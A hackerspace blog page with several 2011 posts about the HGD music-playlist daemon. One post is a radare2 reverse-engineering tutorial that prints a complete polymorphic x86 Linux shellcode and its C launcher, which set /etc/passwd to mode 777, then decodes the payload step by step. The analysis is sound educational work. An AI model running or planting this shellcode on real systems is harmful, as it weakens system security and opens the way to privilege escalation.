<p>It is called <strong>hgdc-x</strong>. The <em><strong>X</strong></em> alludes to the cross-platform nature of the GUI code. By writing it from the ground up in <a title="Lazarus" href="http://lazarus.freepascal.org" target="_blank">Lazarus</a>/Freepascal, it can be compiled for Windows/Linux/Mac OS X/FreeBSD among others, targeting various toolkits like GTK, QT, Win32, and Carbon.</p>
<p>I have since essentially finished the client, which supports all of the usual hgd user features like user authentication, SSL encrypted connection, listing the playlist, queuing tracks and voting tracks off, but also includes added features like album artwork fetching (using the Last.fm API). Limited support is provided for hgd&#8217;s administrative features, so hgdc-x supports song pausing and skipping as long as you are logged in as a user who is an admin on the hgd server.</p>
<p>In the future I will add Last.fm scrobbling, remaining admin features and other cool stuff.</p>
<p>The development version (available right now) been tested on Windows, Linux and Mac OS X, and works fine on all three.</p>
<div id="attachment_889" style="width: 264px" class="wp-caption alignright"><a href="/2011/09/hgdc-x-a-cross-platform-native-hgd-client/hgdcx-3/" rel="attachment wp-att-889"><img class="size-medium wp-image-889" title="hgdcx on Linux" src="//canthack.org/uploads/hgdcx2-254x300.png" alt="hgdcx on Linux" width="254" height="300"/></a><p class="wp-caption-text">hgdcx on Linux</p></div>
<p>Proper tagged releases and pre-compiled binaries will follow, as soon as the hgd server makes its next release (0.5). When this happens the version numbers will be kept in sync with the server. Until then, the HEAD of hgdc-x should work correctly with the HEAD of the main hgd server repository, as I scramble to keep up with API and protocol improvements, so if you can install Lazarus 0.9.30, give it a go if you like!</p>
<p>The source is available from <a href="https://github.com/tristan2468/hgdc-x" target="_blank">GitHub</a>, where an Issue Tracker is active for any inevitable bugs or indeed feature requests you may like to add.</p>
<p>When complete, the same GitHub page will be the place to go for the pre-compiled binaries.</p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/events/" rel="category tag">Events</a>, <a href="/category/programming/" rel="category tag">Programming</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/09/hgdc-x-a-cross-platform-native-hgd-client/#comments">2 Comments</a></span>
</div> 
</div> 
<div id="post-843" class="post-843 post type-post status-publish format-standard hentry category-software">
<h2 class="entry-title"><a href="/2011/07/hgd-0-4-1/" rel="bookmark">HGD 0.4.1 out now!</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/07/hgd-0-4-1/" title="18:48" rel="bookmark"><span class="entry-date">July 24, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/mex/" title="View all posts by Mex">Mex</a></span> </div> 
<div class="entry-content">
<p>Less than a month since our last release and we are at it again! This is just a maintenance release really but we have snuck in a couple of new features for you to play with.</p>
<h2>Whats new.</h2>
<ul>
<li><strong>HUP support</strong> Hit HGD with a HUP signal and it will restart and reload its configs.</li>
<li><strong>Daemonisation</strong> HGD now acts as a proper daemon</li>
<li><strong>Syslog support</strong> Now you don&#8217;t have to rely on stdout for logging.</li>
<li><strong>Clang analyze target</strong> For you clang users try <tt>make analyze</tt> and lookout for new bugs before committing.</li>
<li><strong>Bug fixes</strong> various minor bug fixes.</li>
</ul>
<h2>Download</h2>
<p>Grab the <a href="https://github.com/downloads/vext01/hgd/hgd-0.4.1.tar.gz">tarball</a> or visit the <a href="http://github.com/vext01/hgd">project page</a>.</p>
<p><img src="//imgs.xkcd.com/comics/tapping.png" width="100%"/></p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/software/" rel="category tag">Software</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/07/hgd-0-4-1/#respond">Leave a comment</a></span>
</div> 
</div> 
<div id="post-804" class="post-804 post type-post status-publish format-standard hentry category-software">
<h2 class="entry-title"><a href="/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" rel="bookmark">Adventures with Radare2 #1: A Simple Shellcode Analysis</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" title="14:03" rel="bookmark"><span class="entry-date">July 17, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/edd/" title="View all posts by Edd">Edd</a></span> </div> 
<div class="entry-content">
<p><a href="http://radare.org">Radare2</a> is an open-source reverse engineering toolkit, consisting of a disassembler, debugger and hex editor. In this article I will show you the basics by reversing some shellcode I found on <a href="http://www.projectshellcode.com/" target="_blank">Project Shellcode</a></p>
<h2>Shellcode</h2>
<p>To put this into context let&#8217;s briefly discuss what we mean by the term &#8220;shellcode&#8221;, not to be confused with &#8220;shellscript&#8221;, which is something else entirely. &#8220;Shellcode&#8221; is a term colloquially used to refer to the payload of an exploit. Typically this would be code injected to start a shell.</p>
<p>Project Shellcode is a repository of shellcodes (with source), which I found via <a href="http://reddit.com/r/reverseengineering">reddit.com/r/reverseengineering</a> last month (thanks polsab); let&#8217;s look at one of the examples found there.</p>
<h2>60 Bytes Chmod 777 Polymorphic x86 Linux Shellcode</h2>
<p>The first shellcode I happened to look at from projectshellcode was <a href="http://www.projectshellcode.com/?q=node/289">this</a></p>
<pre>
<code>
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost# gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost# ./polymorphic_chmod
Length: 64
root@localhost# ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost# chmod 644 /etc/passwd
root@localhost# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

#include <stdio.h>

char shellcode[] =
	"\xeb\x11\x5e\x31\xc9\xb1\x27\x80\x6c\x0e\xff\x35\x80\xe9\x01"
	"\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x20\x4a\x66\xf5\xe5\x44"
	"\x90\x66\xfe\x9b\xee\x34\x36\x02\xb5\x66\xf5\xe5\x36\x66\x10"
	"\x02\xb5\x1d\x1b\x34\x34\x34\x64\x9a\xa9\x98\x64\xa5\x96\xa8"
	"\xa8\xac\x99";

int main(void)
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
     
return 0;
}
</code>
</pre>
<p>Thanks to gunslinger for allowing me to use this code as an example.</p>
<p>The description in comments claims that the code sets the file permissions on /etc/passwd to 777, but you would not know that at a glance. What we do know is that we have an array of bytes initialised as hex, which is then cast to a function pointer and called.</p>
<h2>Analysis with Radare2</h2>
<p>NOTE: This analysis was done using a hg tip snapshot of radare2 from July 2011. Some of the features have only recently been implemented or bugfixed, so using an older version will not work 😉 EDIT: Radare-2.0.8 was released 2 days ago, this will work!</p>
<p>So how do we find out what this program does? We could build it and run it, but I won&#8217;t, as it could remove my home directory for all I know. Instead let us examine it statically using radare2.</p>
<p>First we build a binary:</p>
<pre>
<code>
% cc -o shellcode polymorphic_chmod_etc_passwd_777.c 
polymorphic_chmod_etc_passwd_777.c: In function 'main':
polymorphic_chmod_etc_passwd_777.c:53: warning: incompatible implicit
declaration of built-in function 'strlen'
</code>
</pre>
<p>Next we ignore the warning, and now we load it into radare2:</p>
<pre>
<code>
% r2 ./shellcode
 -- In soviet russia radare debugs you!
[0x1c000764]>
</code>
</pre>
<p>I started radare2 without -d, so we are running in &#8220;static&#8221; mode, as opposed to using the debugger built into radare2. Now radare is ready and waiting for commands, so let&#8217;s get to it.</p>
<p>Radare2 commands tend to be very short, some only one letter long. Type &#8216;?&#8217; followed by enter to get an overview of what you can do. Suffixing a command with a question mark, will give more detailed information on it&#8217;s usage.</p>
<p>What we should first do is locate that byte string. Because our binary was not stripped, we have the luxury of knowing what the virtual address of &#8216;main&#8217; is. Radare2 uses the concept of &#8220;flags&#8221; to mark useful locations in binaries. Try typing &#8216;f&#8217; to see a list of flags. The function main will be flagged as &#8216;sym.main&#8217;.</p>
<p>We use the &#8216;pd&#8217; command to disassemble:</p>
<pre>
<code>
[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f68692b6858f9bd89b979f98">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
      0x1c000764  sym.main:
      0x1c000764    0    8d4c2404         lea ecx, [esp+0x4]
      0x1c000768    0    83e4f0           and esp, 0xfffffff0
      0x1c00076b    0    ff71fc           push dword [ecx-0x4]
      0x1c00076e    4+   55               push ebp
      0x1c00076f    8+   89e5             mov ebp, esp
      0x1c000771    8    51               push ecx
      0x1c000772   12+   83ec14           sub esp, 0x14
      0x1c000775   32+   c704244010003c   mov dword [esp], sym.shellcode
      0x1c00077c   32>   e86bfdffff       call dword imp.strlen
         ; imp.strlen() [1]
      0x1c000781   32    bad831003c       mov edx, 0x3c0031d8
      0x1c000786   32    89442408         mov [esp+0x8], eax
      0x1c00078a   32    c74424040100003c mov dword [esp+0x4], str.Lengthd
      0x1c000792   32    891424           mov [esp], edx
      0x1c000795   32>   e822fdffff       call dword imp.fprintf
         ; imp.fprintf() [2]
      0x1c00079a   32    b84010003c       mov eax, sym.shellcode
      0x1c00079f   32    ffd0             call eax
         ; unk()
      0x1c0007a1   32    b80000           invalid
</code>
</pre>
<p>The &#8216;pd&#8217; command will disassemble a chunk of code equal to the &#8220;block size&#8221; (see the &#8216;b&#8217; command) and in this case it looks like main was bigger than our block size. Because we know that GCC will make &#8220;well-formed&#8221; functions, we ask radare2 to analyse this function and print it in its entirety:</p>
<pre>
<code>
[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5031361023293d7e3d31393e">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="700014163003091d5e1d11191e">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
/ function: sym.main (75)
|     0x1c000764  sym.main:
|     0x1c000764    0    8d4c2404         lea ecx, [esp+0x4]
|     0x1c000768    0    83e4f0           and esp, 0xfffffff0
|     0x1c00076b    0    ff71fc           push dword [ecx-0x4]
|     0x1c00076e    4+   55               push ebp
|     0x1c00076f    8+   89e5             mov ebp, esp
|     0x1c000771    8    51               push ecx
|     0x1c000772   12+   83ec14           sub esp, 0x14
|     0x1c000775   32+   c704244010003c   mov dword [esp], sym.shellcode
|     0x1c00077c   32>   e86bfdffff       call dword imp.strlen
|        ; imp.strlen() [1]
|     0x1c000781   32    bad831003c       mov edx, 0x3c0031d8
|     0x1c000786   32    89442408         mov [esp+0x8], eax
|     0x1c00078a   32    c74424040100003c mov dword [esp+0x4], str.Lengthd
|     0x1c000792   32    891424           mov [esp], edx
|     0x1c000795   32>   e822fdffff       call dword imp.fprintf
|        ; imp.fprintf() [2]
|     0x1c00079a   32    b84010003c       mov eax, sym.shellcode
|     0x1c00079f   32    ffd0             call eax
|        ; unk()
|     0x1c0007a1   32    b800000000       mov eax, 0x0
|     0x1c0007a6   32    83c414           add esp, 0x14
|     0x1c0007a9   12-   59               pop ecx
|     0x1c0007aa    8-   5d               pop ebp
|     0x1c0007ab    4-   8d61fc           lea esp, [ecx-0x4]
\     0x1c0007ae    4    c3               ret
      ; ------------
</code>
</pre>
<p>A quick eyeballing of this code shows us what we need to know.  There was enough information in our binary for radare2 to flag the byte string holding the exploit. If you want to see the actual address of this string, you can turn off the asm.filter using the &#8216;e&#8217; command; this will prevent radare2 from substituting symbols names for constants in disassembly views.</p>
<p>What does the program do with the payload? We see strlen() and printf() being called, but more importantly, we see the address of the shellcode being loaded into eax before being called (load at 0x1c00079a, call at 0x1c00079f). The obvious next step is to examine the payload to get an idea of what it might do:</p>
<pre>
<code>
[0x1c000764]> pD <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9badabdbe8e2f6b5e8f3fef7f7f8f4fffe">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
     ,   0x3c001040  sym.shellcode:
     ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
     |   0x3c001042    0    5e               pop esi
     |   0x3c001043   -4-   31c9             xor ecx, ecx
     |   0x3c001045   -4    b127             mov cl, 0x27
    .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
    ||   0x3c00104c   -4    80e901           sub cl, 0x1
    `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
   ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
   | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
   | |      ; 0x3c001042() [4]
   `---> 0x3c001058   -4    204a66           and [edx+0x66], cl
         0x3c00105b   -4    f5               cmc
         0x3c00105c   -4    e544             in eax, 0x44
         0x3c00105e   -4    90               nop
         0x3c00105f   -4    66fe9b           o16 invalid
         0x3c001062   -4    ee               out dx, al
         0x3c001063   -4    3436             xor al, 0x36
         0x3c001065   -4    02b566f5e536     add dh, [ebp+0x36e5f566]
         0x3c00106b   -4    661002           o16 adc [edx], al
         0x3c00106e   -4    b51d             mov ch, 0x1d
         0x3c001070   -4    1b3434           sbb esi, [esp+esi]
         0x3c001073   -4 string (5): "444d"
         0x3c001078   -4 hex length=64 delta=2
0x3c001078  64a5 96a8 a8ac 9900 0000 0000 0100 0000  d...............
0x3c001088  0100 0000 0400 0000 c001 001c 0500 0000  ................
0x3c001098  8803 001c 0600 0000 5802 001c 0a00 0000  ........X.......
0x3c0010a8  bf00 0000 0b00 0000 1000 0000 1500       ..............  
</pre>
<p></code></p>
<p>I used 'pD' here so that I could specify exactly how many bytes to disassemble (I chose 60). So what can we say about this? Well at first glance, there are some invalid operations which can't be executed, so that's a bit fishy.</p>
<p>What I will now is do a symbolic execution of this code in my head. We first jump to 0x3c001053, from here we call to 0x3c001042, which happens to be the instruction right after where we came from in the first place. This could be pointless, but bear in mind that the call has pushed the return address of the call onto the stack. And what do you know, they immediately pop the return address into esi. In 32-bit x86 there is no way of getting directly at the program counter; what you have just seen is a well known hack used to get it. The value of the program counter can be used to refer to code/data relative to the payload (remember that the attacker does not know where his/her code will be relocated by the linker).</p>
<p>So now we are at 0x3c001043 with 0x3c001058 in esi. The code zeros ecx by xoring it with itself, before loading 0x27 into the lowest byte of ecx. The next chunk of code which subtracts 0x35 from a [esi+ecx-0x1], for ecx = {0x27, 0x26, ... , 0x1} and we already know the value of esi from earlier. So by my calculations, we need to subtract 0x35 from 0x27 bytes starting at 0x3c001058 so as to emulate the effect of this self modifying code. We can do this using the 'wo' family of commands; let's ask radare2 for help on this:</p>
<pre>
<code>
[0x1c000764]> wo?
Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
Example:
  wox 0x90   ; xor cur block with 0x90
  wox 90     ; xor cur block with 0x90
  wox 0x0203 ; xor cur block with 0203
  woa 02 03  ; add [0203][0203][...] to curblk
Supported operations:
  woa  +=  addition
  wos  -=  substraction
  wom  *=  multiply
  wod  /=  divide
  wox  ^=  xor
  woo  |=  or
  woA  &#038;=  and
  wor  >>= shift right
  wol  <<= shift left
  wo2  2=  2 byte endian swap
  wo4  4=  4 byte endian swap
</code>
</pre>
<p>We need to use 'wos' so as to subtract a constant from a range of memory addresses, but before that we need to turn on io caching. By default radare2 opens files read-only, unless you give the -w flag. Alternatively we can set the io.cache option on, which caches writes in memory; These writes can be reverted or committed as the user pleases, but we will not be using these facilities for this example.</p>
<pre>
<code>
[0x1c000764]> e io.cache=true
[0x1c000764]> wos 0x35@0x3c001058:0x27
[0x3c001040]> pd
      ,   0x3c001040  sym.shellcode:
      ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
      |   0x3c001042    0    5e               pop esi
      |   0x3c001043   -4-   31c9             xor ecx, ecx
      |   0x3c001045   -4    b127             mov cl, 0x27
     .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
     ||   0x3c00104c   -4    80e901           sub cl, 0x1
     `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
    ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
    | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
    | |      ; 0x3c001042() [4]
   ,`---> 0x3c001058   -4    eb15             jmp 0x3c00106f [5]
   |      0x3c00105a   -4    31c0             xor eax, eax
   |      0x3c00105c   -4    b00f             mov al, 0xf
   |      0x3c00105e   -4    5b               pop ebx
   |      0x3c00105f   -8-   31c9             xor ecx, ecx
   |      0x3c001061   -8    66b9ff01         mov cx, 0x1ff
   |      0x3c001065   -8    cd80             int 0x80
   |         ; syscall[0x80][3840]=?
   |      0x3c001067   -8    31c0             xor eax, eax
   |      0x3c001069   -8    b001             mov al, 0x1
   |      0x3c00106b   -8    31db             xor ebx, ebx
   |      0x3c00106d   -8    cd80             int 0x80
   |         ; msync (0x100,0x0,0x1ff)
   `----> 0x3c00106f   -8>   e8e6ffffff       call dword 0x3c00105a
   |         ; 0x3c00105a() [6]
          0x3c001074   -8 string (5): "444d"
          0x3c001079   -8 hex length=64 delta=3
0x3c001079  7061 7373 7764 0055 2720 666f 7220 7265  passwd.U' for re
0x3c001089  646f 0000 0000 0000 0000 0000 0000 0000  do..............
0x3c001099  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x3c0010a9  0000 0000 0000 0000 0000 0000 00         .............   
</code>
</pre>
<p>And now we see that the instructions following 0x3c001058 are now valid. The first thing that I notice are these 'int 0x80' instructions. On a UNIX like operating system (running on x86/amd64), firing an 0x80 interrupt has a special meaning, it asks the kernel to execute a system call, whose number is held in eax.</p>
<p>By following execution mentally (through a jump and a call), I can tell you that eax takes a value of 15 at 0x3c001065 and 1 at 0x3c00106d. We can identify these Linux system calls by grokking the 32-bit x86 kernel headers, or the easy way, google for them:<br />
http://asm.sourceforge.net/syscall.html</p>
<p>So we have a call to chmod(2) at 0x3c001065, followed by a call to exit(2) at 0x3c00106d. We will need to examine the arguments to calls in order to understand what they do. On a Linux system, system call arguments are passed in registers (ebx, ecx, edx, esi, edi, ebp).</p>
<p>Let's look at the call to chmod(2); This call takes two arguments, so we should look in ebx and ecx for a char pointer indicating the path to a file, and a mode_t (which is just an integer really) specifying the mode (or permissions) to change to.  ebx is popped from the top of the stack at 0x3c00105e and if we follow execution backwards, we see that the last thing on the stack was a "return address" (0x3c001074) of the call at 0x3c00106f. Ofcourse this is not a return address at all, just a sneaky way to bundle a string into the payload. Let's look at the string using 'ps':</p>
<pre>
<code>
[0x1c000764]> ps@0x3c001074
/etc/passwd
</code>
</pre>
<p>The second argument of the chmod call is in the ecx register and takes the value 0x1ff; which in octal, is 0777. So we have a call 'chmod("/etc/passwd", 0777);'. Naughty!</p>
<p>After this the program simply calls the exit(2) system call.</p>
<h2>Concluding Comments</h2>
<p>What we have seen is an exploit which modifies itself at runtime in order to resist static disassembly. The technique is not new and is an easy way of preventing hard coded strings (like "/etc/passwd") from being detectable with utilities like strings(1).</p>
<p>In fact, this exploit should not work on modern operating systems, as the payload was situated in the '.data' section of the binary, which (on any sane OS) can not be both executable and writable. I tried stepping over the call to the payload on my OpenBSD machine and it refused to execute, which is a good thing. EDIT: After discussion on <a href="http://www.reddit.com/r/ReverseEngineering/comments/is4e5/adventures_with_radare2_1_a_simple_shellcode/">reddit</a>, we concluded that this code should not work on modern architectures implementing a NX bit (or equivalent) and for other architectures, write-xor-execute protection can be implemented in software. Thanks for the clarification reddit.</p>
<p>We explored some of the basic features of radare2, however, we have only scratched the surface. Go check it out at <a href="http://radare.org">radare.org</a></p>
<p>If you fancy something slightly harder, try the same analysis on a stripped binary!</p>
<p>Please let us know if you spot any errors or have any comments. Cheers.</p>
							</div><!-- .entry-content -->
	
			<div class="entry-utility">
									<span class="cat-links">
						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/software/" rel="category tag">Software</a>					</span>
					<span class="meta-sep">|</span>
												<span class="comments-link"><a href="/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comments">7 Comments</a></span>
							</div><!-- .entry-utility -->
		</div><!-- #post-## -->

		
	


			<div id="post-781" class="post-781 post type-post status-publish format-standard hentry category-software">
			<h2 class="entry-title"><a href="/2011/07/phphgdc-a-php-client-for-hgd/" rel="bookmark">phphgdc &#8211; A PHP client for HGD</a></h2>

			<div class="entry-meta">
				<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/07/phphgdc-a-php-client-for-hgd/" title="17:13" rel="bookmark"><span class="entry-date">July 3, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/omer/" title="View all posts by Omer">Omer</a></span>			</div><!-- .entry-meta -->

				<div class="entry-content">
				<p><a href="https://github.com/vext01/hgd">HGD</a> is <a href="http://twitter.com/vext01">Edd</a> and <a href="http://twitter.com/egelmex">Mex</a>&#8216;s awesome network playlist daemon that we use at our hacknights. It lets us queue songs from our machines to a single set of speakers, which is infinitely easier than swapping an audio cable around every time someone wants play a song. It even has a &#8216;vote off&#8217; feature for rubbish songs.</p>
<p>At the last hacknight I wrote a simple PHP client for the HGD that will let people queue songs from their browsers. This is quite useful as currently the official hgd client doesn&#8217;t compile (easily) on Windows and we do have a few Windows users. It is also useful for the lazy people who can&#8217;t be bothered with the installation of a client since they can just point their browsers to my PHP client.</p>
<p><a href="/uploads/336407484.png" rel="fancybox-781"><img class="aligncenter size-medium wp-image-782" title="Login screen for phphgdc" src="//canthack.org/uploads/336407484-300x281.png" alt="" width="300" height="281" /></a></p>
<p>The idea is to set this up on the same machine that runs the hgd but that&#8217;s not a requirement since the client uses sockets to communicate with the server.</p>
<p>It is pretty much a work-in-progress so it&#8217;s a bit rough around the edges but the basic functionality (authentication/queuing songs) works fine. The source lives<a href="https://github.com/omerk/phphgdc"> here</a>, in case you want to play with it. I&#8217;ll prettify and add a few more features like playlist and vote off support to it at the next hack event.</p>
<p>And here&#8217;s the environment (i.e: the last hacknight) this was conceived in:</p>
<p><a href="/uploads/2011-07-01-19-12-59.jpg" rel="fancybox-781"><img class="aligncenter size-medium wp-image-783" title="Too many Macs!" src="//canthack.org/uploads/2011-07-01-19-12-59-224x300.jpg" alt="" width="224" height="300" /></a></p>
<p>&nbsp;</p>
							</div><!-- .entry-content -->
	
			<div class="entry-utility">
									<span class="cat-links">
						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/software/" rel="category tag">Software</a>					</span>
					<span class="meta-sep">|</span>
												<span class="comments-link"><a href="/2011/07/phphgdc-a-php-client-for-hgd/#comments">2 Comments</a></span>
							</div><!-- .entry-utility -->
		</div><!-- #post-## -->

		
	

				<div id="nav-below" class="navigation">
					<div class="nav-previous"><a href="/page/3/index.html" ><span class="meta-nav">&larr;</span> Older posts</a></div>
					<div class="nav-next"><a href="/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
				</div><!-- #nav-below -->
			</div><!-- #content -->
		</div><!-- #container -->


		<div id="primary" class="widget-area" role="complementary">
			<ul class="xoxo">

<li id="search-2" class="widget-container widget_search"><form role="search" method="get" id="searchform" class="searchform" action="//canthack.org/wp-content/plugins/really-static/static/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form></li>		<li id="recent-posts-2" class="widget-container widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
					<li>
				<a href="/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/">A new mod for Mega Drive 60Hz colour correction</a>
						</li>
					<li>
				<a href="/2013/06/barcamp-canterbury-2013-round-up/">BarCamp Canterbury 2013 round-up</a>
						</li>
					<li>
				<a href="/2013/04/pipurr-the-remote-cat-interaction-server/">PiPurr &#8211; The Remote Cat Interaction Server</a>
						</li>
					<li>
				<a href="/2012/09/introducing-the-sin-edds-ym2612-midi-instrument/">Introducing &#8216;The Sin': Edd&#8217;s YM2612 MIDI Instrument</a>
						</li>
					<li>
				<a href="/2012/08/oggcamp-12/">OggCamp 12</a>
						</li>
				</ul>
		</li><li id="recent-comments-2" class="widget-container widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://balau82.wordpress.com/2011/03/29/programming-arduino-uno-in-pure-c/' rel='external nofollow' class='url'>Programming Arduino Uno in pure C | Freedom Embedded</a></span> on <a href="/2010/12/programming-the-arduino-in-pure-c/#comment-57224/index.html">Programming the Arduino in Pure C.</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://zeidman.biz/blog/?p=11' rel='external nofollow' class='url'>Building an Arduino Robot using SynthOS | Zeidman Technologies Blog</a></span> on <a href="/2010/12/programming-the-arduino-in-pure-c/#comment-54358/index.html">Programming the Arduino in Pure C.</a></li><li class="recentcomments"><span class="comment-author-link">black</span> on <a href="/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/#comment-45466/index.html">A new mod for Mega Drive 60Hz colour correction</a></li><li class="recentcomments"><span class="comment-author-link">Cami</span> on <a href="/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/#comment-44423/index.html">A new mod for Mega Drive 60Hz colour correction</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://famfest.info' rel='external nofollow' class='url'>Manu</a></span> on <a href="/2012/09/introducing-the-sin-edds-ym2612-midi-instrument/#comment-39117/index.html">Introducing &#8216;The Sin': Edd&#8217;s YM2612 MIDI Instrument</a></li></ul></li><li id="archives-2" class="widget-container widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
	<li><a href='/2014/04/'>April 2014</a></li>
	<li><a href='/2013/06/'>June 2013</a></li>
	<li><a href='/2013/04/'>April 2013</a></li>
	<li><a href='/2012/09/'>September 2012</a></li>
	<li><a href='/2012/08/'>August 2012</a></li>
	<li><a href='/2012/06/'>June 2012</a></li>
